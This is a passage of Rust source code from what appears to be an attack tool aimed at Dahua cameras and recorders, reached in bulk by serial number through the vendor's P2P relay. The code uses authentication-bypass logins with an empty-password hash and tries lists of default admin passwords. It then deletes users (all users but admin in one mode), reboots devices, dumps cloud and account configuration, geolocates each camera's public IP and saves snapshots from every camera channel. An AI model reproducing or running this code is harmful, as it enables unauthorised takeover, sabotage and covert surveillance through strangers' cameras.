    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        let chal = match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(x) => x,
            None => {
                eprintln!("  [-] DHIP challenge failed");
                continue;
            }
        };
        if args.verbose {
            eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
        }

        // Primary: DHIP delete on the live challenge channel (no re-bind).
        let mut ok = false;
        match dhip_try_delete_user(
            sock,
            pcp_session,
            &chal,
            user_id,
            user_name.clone(),
            args,
            probe_timeout,
        )
        .await
        {
            Ok(()) => {
                ok = true;
            }
            Err(e) => {
                if args.verbose {
                    eprintln!("[debug] DHIP delete failed ({}), trying HTTP", e);
                }
            }
        }
        if !ok {
            // Il canale del challenge è probabilmente morto (o il dispositivo accetta
            // un solo canale PTCP): nuovo handshake prima dei tentativi HTTP.
            let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
                    continue;
                }
            };
            let (sock2, pcp_session2) = if args.relay {
                (&hr2.agent_socket, &hr2.agent_session)
            } else {
                (&hr2.device_socket, &hr2.device_session)
            };
            for &port in &[80u16, 5000] {
                match http_try_delete_user(
                    sock2,
                    pcp_session2,
                    &chal.realm,
                    port,
                    user_id,
                    user_name.clone(),
                    args,
                )
                .await
                {
                    Ok(()) => {
                        ok = true;
                        break;
                    }
                    Err(e) => {
                        if args.verbose {
                            eprintln!("[debug] delete on port {} failed: {}", port, e);
                        }
                    }
                }
            }
        }
        if !ok {
            let label = user_name
                .as_deref()
                .map(|n| format!("'{}'", n))
                .unwrap_or_else(|| format!("{}", user_id.unwrap_or(0)));
            eprintln!("  [-] Failed to delete user {}", label);
        }
    }
    Ok(())
}

/// Delete ALL users from each device except the admin user (id 2, name "admin").
/// For each device: DHIP delete-all on the live challenge channel first, then
/// HTTP/RPC2 fallback (new handshake) on ports 80 then 5000.
async fn delete_all_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {} — DELETE ALL", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        let chal = match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(x) => x,
            None => {
                eprintln!("  [-] DHIP challenge failed");
                continue;
            }
        };
        if args.verbose {
            eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
        }

        let mut ok = false;
        match dhip_try_delete_all(sock, pcp_session, &chal, args, probe_timeout).await {
            Ok(()) => {
                ok = true;
            }
            Err(e) => {
                if args.verbose {
                    eprintln!("[debug] DHIP delete-all failed ({}), trying HTTP", e);
                }
            }
        }
        if !ok {
            let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
                    continue;
                }
            };
            let (sock2, pcp_session2) = if args.relay {
                (&hr2.agent_socket, &hr2.agent_session)
            } else {
                (&hr2.device_socket, &hr2.device_session)
            };
            for &port in &[80u16, 5000] {
                match http_try_delete_all(sock2, pcp_session2, &chal.realm, port, args).await {
                    Ok(()) => {
                        ok = true;
                        break;
                    }
                    Err(e) => {
                        if args.verbose {
                            eprintln!("[debug] delete-all on port {} failed: {}", port, e);
                        }
                    }
                }
            }
        }
        if !ok {
            eprintln!("  [-] Failed to delete all users on {}", serial);
        }
    }
    Ok(())
}

/// Reboot each device via `magicBox.reboot` over the DHIP channel
/// (handshake → challenge → established session → reboot).
async fn reboot_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        match reboot_device(serial, args, probe_timeout).await {
            Ok(()) => println!("  [+] {} → REBOOT OK", serial),
            Err(e) => eprintln!("  [-] {} → REBOOT FAIL: {}", serial, e),
        }
    }
    Ok(())
}

/// Reboot a single device: P2P handshake, DHIP challenge on the live channel,
/// establish the session and send `magicBox.reboot`.
async fn reboot_device(serial: &str, args: &Args, probe_timeout: Duration) -> Result<(), String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
        .await
        .ok_or("DHIP challenge failed (no realm)")?;
    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
    }

    let ctx = match dhip_established_session(sock, pcp_session, &chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    // magicBox.reboot — standard Dahua DHIP method for rebooting the device.
    // Alcuni firmware con `params: {}` fanno un power-off che non si completa;
    // proviamo più varianti (mode 0/1, restart, system.reboot) finché una
    // risponde "true".
    let reboot_variants: Vec<Value> = vec![
        json!({"id": 666, "method": "magicBox.reboot", "params": {"mode": 0}}),
        json!({"id": 666, "method": "magicBox.reboot", "params": {}}),
        json!({"id": 666, "method": "magicBox.reboot", "params": {"mode": 1}}),
        json!({"id": 666, "method": "magicBox.restart", "params": {}}),
        json!({"id": 666, "method": "system.reboot", "params": {}}),
    ];
    if args.verbose {
        eprintln!(
            "[debug] DHIP reboot: trying {} variants",
            reboot_variants.len()
        );
    }

    let mut result = Err("all reboot variants failed".into());
    for v in &reboot_variants {
        let method = v.get("method").and_then(|m| m.as_str()).unwrap_or("?");
        let req = json!({"id": v.get("id").unwrap(), "magic": "0x1234",
            "method": method, "params": v.get("params").unwrap(), "session": ctx.session_id});
        if args.verbose {
            eprintln!("[debug] DHIP reboot {}: {}", method, req);
        }
        match dhip_call(
            sock,
            pcp_session,
            &ctx.dhip,
            &req.to_string(),
            probe_timeout,
        )
        .await
        {
            Some(t) => {
                if args.verbose {
                    eprintln!("[debug] DHIP {} response: {}", method, t);
                }
                match serde_json::from_str::<Value>(&t) {
                    Ok(v) if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) => {
                        println!("  [+] {} accepted", method);
                        result = Ok(());
                        break;
                    }
                    Ok(v) => {
                        // Se il "result" è assente ma dentro la stringa c'è true,
                        // oppure errore esplicito — registriamo e proviamo il prossimo.
                        let msg = v
                            .get("error")
                            .and_then(|e| e.get("message"))
                            .and_then(|m| m.as_str())
                            .unwrap_or("rejected");
                        if args.verbose {
                            eprintln!("[debug] {}: {}", method, msg);
                        }
                        result = Err(format!("{}: {}", method, msg));
                    }
                    Err(_) => result = Err(format!("{}: bad response", method)),
                }
            }
            None => {
                // Il device potrebbe riavviarsi subito e chiudere il canale senza
                // rispondere: senza errore esplicito lo consideriamo inviato.
                eprintln!(
                    "  [i] {} no response (channel closed during reboot — assume sent)",
                    method
                );
                result = Ok(());
                break;
            }
        }
    }

    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    result
}

/// Check the P2P/cloud state of each device. Reads the same P2P tunnel that
/// SmartPSS would use and reports the P2P config (account/UID/status) as seen
/// by the device, so you can tell why SmartPSS shows it offline.
async fn check_p2p_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");
        match check_p2p_device(serial, args, probe_timeout).await {
            Ok(()) => {}
            Err(e) => eprintln!("  [-] {} → P2P CHECK FAIL: {}", serial, e),
        }
    }
    Ok(())
}

/// Single-device P2P state check: handshake → challenge → session → read the
/// P2P/Network config tables and report anything relevant to cloud visibility.
async fn check_p2p_device(
    serial: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;
    let device_ip = hr.device_public_ip.clone();

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
        .await
        .ok_or("DHIP challenge failed (no realm)")?;
    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
    }

    let ctx = match dhip_established_session(sock, pcp_session, &chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    println!(
        "  [i] P2P public address reported by relay: {}",
        if device_ip.is_empty() {
            "(none)"
        } else {
            &device_ip
        }
    );

    // Try multiple config tables that may expose P2P/cloud settings.
    let tables = [
        "P2P", "p2p", "Network", "network", "_Cloud", "Cloud", "System", "system",
    ];
    let mut read_any = false;
    let mut found_uid: Option<String> = None;
    for t in tables {
        let req = json!({"id": 444, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": t}, "session": ctx.session_id});
        if let Some(resp) = dhip_call(
            sock,
            pcp_session,
            &ctx.dhip,
            &req.to_string(),
            probe_timeout,
        )
        .await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&resp) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    read_any = true;
                    if args.verbose {
                        eprintln!("[debug] getConfig({}) response: {}", t, v);
                    }
                    let params = v.get("params");
                    if let Some(params) = params {
                        if let Some(uid) = extract_p2p_uid(params) {
                            if found_uid.as_deref() != Some(&uid) {
                                found_uid = Some(uid);
                            }
                        }
                        let interesting = relevant_p2p_fields(params);
                        if !interesting.is_empty() {
                            println!("  [P2P/{}] {}", t, interesting);
                        } else if is_strongly_p2p_table(t) {
                            // Tabella chiaramente P2P/cloud ma senza campi riconosciuti:
                            // stampa il contenuto pieno per vedere i dati reali.
                            let compact = params.to_string();
                            if compact.len() > 2 {
                                println!("  [P2P/{}] (raw) {}", t, compact);
                            }
                        }
                    }
                } else if args.verbose {
                    let msg = v
                        .get("error")
                        .and_then(|e| e.get("message"))
                        .and_then(|m| m.as_str())
                        .unwrap_or("");
                    eprintln!("[debug] getConfig({}) error: {}", t, msg);
                }
            }
        }
    }
    if !read_any {
        println!("  [!] device did not expose P2P/Network config via getConfig");
    }

    // UID / identificativo P2P da usare in SmartPSS (molti device usano il serial
    // stesso; a volte c'è un campo dedicato UID/SN/SeedsId). In evidenza all'inizio.
    match found_uid {
        Some(uid) if !uid.is_empty() => {
            println!(
                "\n  => P2P UID / identificativo da usare in SmartPSS: [{}]",
                uid
            );
        }
        _ => {
            println!("\n  => P2P UID non esposto dalle tabelle; prova a usare il serial come identificativo: [{}]", serial);
        }
    }

    // Ultima riga: IP pubblico della cam + geolocalizzazione (country/city).
    let geo = resolve_geo(&device_ip).await;
    let public_ip = if device_ip.is_empty() {
        "(none)".to_string()
    } else {
        device_ip.clone()
    };
    match geo {
        Some(g) => println!(
            "  => Public IP: {} | Country: {} ({}) | City: {}",
            public_ip, g.country, g.country_code, g.city
        ),
        None => println!("  => Public IP: {} | Country: N/A | City: N/A", public_ip),
    }

    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    Ok(())
}

/// Capture a live JPG snapshot of every active camera channel of each device.
/// Discovers the channels via configManager.getConfig, then grabs `/cgi-bin/
/// snapshot.cgi?channel=N` through the same PTCP tunnel.
async fn snapshot_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    if args.user.is_empty() || args.password.is_empty() {
        return Err(
            "--snapshot requires --user (-u) and --password (-w) as the camera stream credentials"
                .into(),
        );
    }
    std::fs::create_dir_all("snapshots").ok();
    let mut failed_serials: Vec<String> = Vec::new();
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] snapshot {}", i + 1, serials.len(), serial);
        println!("========================================");
        match snapshot_device(serial, args, probe_timeout).await {
            Ok(()) => {}
            Err(e) => {
                eprintln!("  [-] {} → SNAPSHOT FAIL: {}", serial, e);
                failed_serials.push(serial.clone());
            }
        }
    }
    if !failed_serials.is_empty() {
        let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
        let log_name = format!("{}.log", now.format("%Y%d%m%H%M"));
        std::fs::write(&log_name, failed_serials.join("\n") + "\n").ok();
        println!(
            "[*] {} failed snapshot(s) — serials saved to {}",
            failed_serials.len(),
            log_name
        );
    }
    Ok(())
}

async fn snapshot_device(serial: &str, args: &Args, probe_timeout: Duration) -> Result<(), String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
        .await
        .ok_or("DHIP challenge failed (no realm)")?;
    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
    }

    let ctx = match dhip_established_session(sock, pcp_session, &chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    // 1) Discover active channels.
    let mut channels =
        discover_channels(sock, pcp_session, &ctx, args.verbose, probe_timeout).await;
    if channels.is_empty() {
        println!("  [!] no channel list exposed; falling back to probe 1..=16");
        channels = (1..=16).collect();
    }
    println!("  [i] {} channel(s) to snapshot", channels.len());

    // 2) Snapshot each channel over HTTP through the same tunnel.
    let mut captured = 0usize;
    for ch in &channels {
        let path = format!(
            "/cgi-bin/snapshot.cgi?channel={}&user={}&password={}",
            ch, args.user, args.password
        );
        let mut body: Option<(String, Vec<u8>)> = None;
        for &port in &[80u16, 5000u16] {
            let host = format!("127.0.0.1:{}", port);
            let r = http_get_binary(
                sock,
                pcp_session,
                chal.realm_id,
                &host,
                &path,
                probe_timeout,
                &args.user,
                &args.password,
            )
            .await;
            if r.is_some() {
                body = r;
                break;
            }
            if LAST_CALL_DISC.load(Ordering::Relaxed) {
                break;
            }
        }

        match body {
            Some((headers, bytes)) => {
                let status_line = headers.lines().next().unwrap_or("").to_string();
                let is_jpeg =
                    bytes.len() >= 3 && bytes[0] == 0xFF && bytes[1] == 0xD8 && bytes[2] == 0xFF;
                if is_jpeg {
                    let fname = format!("snapshots/{0}_ch{1}.jpg", serial, ch);
                    std::fs::write(&fname, &bytes)
                        .map_err(|e| format!("cannot write {}: {}", fname, e))?;
                    println!("  [+] ch{} → {} ({} bytes)", ch, fname, bytes.len());
                    captured += 1;
                } else {
                    // not a JPEG — probably an error body (auth failure, etc.)
                    let preview: String = bytes.iter().take(120).map(|&b| b as char).collect();
                    println!(
                        "  [-] ch{} → not a JPEG ({}) body: {}",
                        ch, status_line, preview
                    );
                }
            }
            None => {
                println!(
                    "  [-] ch{} → no response via snapshot CGI (channel may not expose it / needs RTSP)",
                    ch
                );
            }
        }
    }

    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;

    if captured == 0 {
        Err(format!("no snapshot captured for {}", serial))
    } else {
        Ok(())
    }
}

/// Ask the device which camera channels exist/are active, using getConfig on the
/// tables that describe channels. Fall back to a progressive probe if nothing
/// structured comes back.
async fn discover_channels(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    ctx: &DhipCtx,
    verbose: bool,
    probe_timeout: Duration,
) -> Vec<u32> {
    let tables = ["ChannelTitle", "VideoInChannels", "Camera"];
    let mut seen: Vec<u32> = Vec::new();
    for t in tables {
        let req = json!({"id": 445, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": t}, "session": ctx.session_id});
        if let Some(resp) = dhip_call(
            sock,
            pcp_session,
            &ctx.dhip,
            &req.to_string(),
            probe_timeout,
        )
        .await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&resp) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    if let Some(params) = v.get("params") {
                        let ids = collect_channel_ids(params);
                        for id in ids {
                            if id > 0 && !seen.contains(&id) {
                                seen.push(id);
                            }
                        }
                        if !seen.is_empty() {
                            if verbose {
                                eprintln!("[debug] discover_channels({}): {:?}", t, seen);
                            }
                            seen.sort_unstable();
                            return seen;
                        }
                    }
                }
            }
        }
    }
    seen
}

/// Recursively collect numeric channel ids from a getConfig params object.
/// Looks for `Id`/`ChannelId`/`Channel`/`ChannelNo` fields that look like a
/// 1-based camera index, and counts array entries whose objects carry such an id.
fn collect_channel_ids(params: &serde_json::Value) -> Vec<u32> {
    fn is_id_key(k: &str) -> bool {
        let l = k.to_lowercase();
        l == "channelid"
            || l == "channelidno"
            || l == "channelno"
            || (l == "channel" && k.chars().all(|c| c.is_alphanumeric() || c == '#'))
            || (l == "id" || l == "cameraid" || l == "videoinputchannelid")
    }
    let mut out: Vec<u32> = Vec::new();
    fn walk(v: &serde_json::Value, is_id_key: &dyn Fn(&str) -> bool, out: &mut Vec<u32>) {
        match v {
            serde_json::Value::Object(map) => {
                for (k, val) in map {
                    if is_id_key(k) {
                        if let Some(n) = val.as_u64() {
                            out.push(n as u32);
                        } else if let Some(n) = val.as_i64() {
                            if n > 0 {
                                out.push(n as u32);
                            }
                        } else if let Some(s) = val.as_str() {
                            if let Ok(n) = s.trim().parse::<u64>() {
                                out.push(n as u32);
                            }
                        }
                    }
                    walk(val, is_id_key, out);
                }
            }
            serde_json::Value::Array(arr) => {
                for item in arr {
                    walk(item, is_id_key, out);
                }
            }
            _ => {}
        }
    }
    walk(params, &is_id_key, &mut out);
    out.sort_unstable();
    out.dedup();
    out
}

/// Extract flat `key=value` pairs from a getConfig params object that look P2P/
/// cloud related (account, user, status, regist, online, uid, enabled, msg).
fn relevant_p2p_fields(params: &serde_json::Value) -> String {
    const KEYS: &[&str] = &[
        "Account",
        "account",
        "User",
        "user",
        "UserName",
        "Password",
        "Status",
        "status",
        "Regist",
        "regist",
        "RegistStatus",
        "Online",
        "online",
        "State",
        "state",
        "Enable",
        "enable",
        "UID",
        "uid",
        "Serial",
        "Msg",
        "msg",
        "Info",
        "Address",
        "Server",
    ];
    let mut out: Vec<String> = Vec::new();
    collect_p2p(params, KEYS, &mut out, "");
    out.join("  ")
}

/// True for config table names that clearly relate to P2P/cloud (their full raw
/// content should be dumped even if no individual P2P key was recognised).
fn is_strongly_p2p_table(name: &str) -> bool {
    matches!(
        name,
        "P2P" | "p2p" | "Network" | "network" | "_Cloud" | "Cloud" | "cloud" | "DDNS" | "ddns"
    )
}

/// Try to find the P2P UID/identifier of the device inside a getConfig params
/// object. Looks for dedicated fields (UID, SN, SeedsId, DeviceID, ...) and for
/// known string forms (e.g. `SEED-xxxx...`). Returns the first convincing match.
fn extract_p2p_uid(params: &serde_json::Value) -> Option<String> {
    const UID_KEYS: &[&str] = &[
        "UID", "uid", "Uid", "SN", "sn", "SeedsId", "SeedsID", "DeviceID", "DeviceSN", "DeviceID",
        "ID", "P2pId", "P2PId", "CloudUid", "CloudUID",
    ];
    find_uid_value(params, UID_KEYS)
}

fn find_uid_value(v: &serde_json::Value, keys: &[&str]) -> Option<String> {
    match v {
        serde_json::Value::Object(map) => {
            for (k, val) in map {
                let key_lower = k.to_lowercase();
                let is_uid_key = keys.iter().any(|kk| kk.eq_ignore_ascii_case(k))
                    || key_lower.contains("seed")
                    || key_lower.contains("uid")
                    || key_lower == "sn";
                if is_uid_key {
                    if let Some(s) = uid_from_value(val) {
                        // evita valori banali/vuoti/placeholder
                        let t = s.trim();
                        if !t.is_empty()
                            && !t.eq_ignore_ascii_case("null")
                            && t != "-"
                            && !t.eq_ignore_ascii_case("0")
                        {
                            return Some(t.to_string());
                        }
                    }
                }
                if let Some(found) = find_uid_value(val, keys) {
                    return Some(found);
                }
            }
        }
        serde_json::Value::Array(arr) => {
            for item in arr {
                if let Some(found) = find_uid_value(item, keys) {
                    return Some(found);
                }
            }
        }
        _ => {}
    }
    None
}

fn uid_from_value(v: &serde_json::Value) -> Option<String> {
    match v {
        serde_json::Value::String(s) => {
            // riconosce anche UID racchiuso in testi tipo "SEED-xxxx" o "UID:xxx"
            let t = s.trim();
            if t.len() >= 5 {
                return Some(t.to_string());
            }
            None
        }
        serde_json::Value::Number(n) => Some(n.to_string()),
        serde_json::Value::Null | serde_json::Value::Bool(_) => None,
        serde_json::Value::Object(_) | serde_json::Value::Array(_) => None,
    }
}

fn collect_p2p(v: &serde_json::Value, keys: &[&str], out: &mut Vec<String>, prefix: &str) {
    match v {
        serde_json::Value::Object(map) => {
            for (k, val) in map {
                let key_lower = k.to_lowercase();
                let is_relevant = keys.iter().any(|kk| kk.eq_ignore_ascii_case(k))
                    || key_lower.contains("p2p")
                    || key_lower.contains("cloud")
                    || key_lower.contains("ddns");
                if is_relevant {
                    let value_str = match val {
                        serde_json::Value::Object(_) | serde_json::Value::Array(_) => {
                            // compatta come JSON monolinea
                            val.to_string()
                        }
                        _ => val.to_string(),
                    };
                    out.push(format!("{}{}={}", prefix, k, value_str));
                }
                collect_p2p(val, keys, out, &format!("{}{}.", prefix, k));
            }
        }
        serde_json::Value::Array(arr) => {
            for (i, item) in arr.iter().enumerate() {
                collect_p2p(item, keys, out, &format!("{}[{}].", prefix, i));
            }
        }
        _ => {}
    }
}

/// Establish an authenticated HTTP/RPC2 session over the PTCP tunnel on a given
/// port. Performs the PTCP bind, the login challenge, and the real/bypass login;
/// returns the bound `realm_id` and the session string. The channel is left open.
async fn http_establish_session(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    args: &Args,
) -> Result<(u32, String), String> {
    let bind_timeout = Duration::from_secs(15);
    let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout)
        .await
        .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;

    let host = format!("127.0.0.1:{}", port);
    let timeout = Duration::from_secs(15);

    let login1 = json!({
        "method": "global.login",
        "params": {
            "userName": &args.admin_user,
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
        },
        "id": 10000,
    });

    let resp1 = http_call(
        sock,
        pcp_session,
        realm_id,
        &host,
        "/RPC2_Login",
        &login1.to_string(),
        timeout,
        "",
    )
    .await
    .ok_or("HTTP login challenge timeout")?;
    let resp1_body = http_extract_body(&resp1).ok_or("No body in HTTP challenge response")?;
    let val1: Value = serde_json::from_str(resp1_body)
        .map_err(|e| format!("bad JSON in HTTP challenge: {}", e))?;

    let session = val1
        .get("session")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();

    // Already logged in (some firmware returns result:true immediately)
    if val1
        .get("result")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        return Ok((realm_id, session));
    }

    if session.is_empty() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("no session in HTTP challenge".into());
    }

    let http_realm = val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let http_random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let hash = empty_password_hash(&args.admin_user, http_realm, http_random);

    let mut login_ok = false;
    let bypasses = [("Loopback", "Local"), ("Direct", "NetKeyboard")];
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, http_realm, http_random, &args.admin_pass);
        let login2 = json!({
            "method": "global.login", "session": &session, "params": {
                "userName": &args.admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "clientType": "Local",
                "authorityType": "Default", "passwordType": "Default",
            }, "id": 10001,
        });
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2_Login",
            &login2.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        login_ok = true;
                    }
                }
            }
        }
    }

    if !login_ok && args.try_defaults {
        for pw in DEFAULT_ADMIN_PASSWORDS {
            let pw_hash = password_hash(&args.admin_user, http_realm, http_random, pw);
            let login2 = json!({
                "method": "global.login", "session": &session, "params": {
                    "userName": &args.admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
                    "loginType": "Loopback", "clientType": "Local",
                    "authorityType": "Default", "passwordType": "Default",
                }, "id": 10001,
            });
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            if args.verbose {
                                eprintln!("[debug] HTTP login OK with default password '{}'", pw);
                            }
                            break;
                        }
                        if args.verbose {
                            eprintln!("[debug] HTTP default password '{}' rejected: {}", pw, b);
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        for (login_type, client_type) in &bypasses {
            let login2 = json!({
                "method": "global.login", "session": &session, "params": {
                    "userName": &args.admin_user, "password": hash, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "clientType": client_type,
                    "authorityType": "Default", "passwordType": "Default",
                }, "id": 10001,
            });
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("HTTP bypass login failed".into());
    }

    Ok((realm_id, session))
}

/// Delete a user via HTTP/RPC2 on a specific port (bypass login first).
async fn http_try_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _dh_realm: &str,
    port: u16,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
) -> Result<(), String> {
    if args.verbose {
        eprintln!(
            "[debug] HTTP deleteUser (Id={:?}, Name={:?}) using port {}",
            user_id, user_name, port
        );
    }
    let (realm_id, session) = http_establish_session(sock, pcp_session, port, args).await?;
    let host = format!("127.0.0.1:{}", port);
    let timeout = Duration::from_secs(15);
    let result = http_delete_user(
        sock,
        pcp_session,
        realm_id,
        &host,
        &session,
        user_id,
        user_name,
        args,
    )
    .await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Send userManager.deleteUser (resolves the full user object from Id or Name first).
async fn http_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(15);

    // Resolve user object via getUserInfoAll (by Id or by Name).
    // La tupla (Option<Value>, bool): il bool = lista utenti letta con successo (usato
    // per il fail-fast sotto, così `6B003ACPAZ64EDE` non spreca ~13 varianti deleteUser
    // con {"name":null} → tutte rifiutate con 268894211 "Request invalid param!").
    let (user_obj, listed) = if let Some(n) = &user_name {
        let (o, l) = http_find_user_object_by_name(
            sock,
            pcp_session,
            realm_id,
            host,
            session,
            n,
            timeout,
            args.verbose,
        )
        .await;
        (o, l)
    } else {
        let (o, l) = http_find_user_object(
            sock,
            pcp_session,
            realm_id,
            host,
            session,
            user_id.unwrap_or(0),
            timeout,
            args.verbose,
        )
        .await;
        (o, l)
    };
    let user_id = user_obj
        .as_ref()
        .and_then(|u| u.get("Id"))
        .and_then(|x| x.as_u64())
        .map(|v| v as u32)
        .unwrap_or(user_id.unwrap_or(0));
    let name = user_obj
        .as_ref()
        .and_then(|u| u.get("Name"))
        .and_then(|n| n.as_str())
        .map(String::from)
        .or(user_name);
    match &name {
        Some(n) => {
            if args.verbose {
                eprintln!("[debug] delete target -> Name '{}' (Id {})", n, user_id);
            }
        }
        None => {
            if args.verbose {
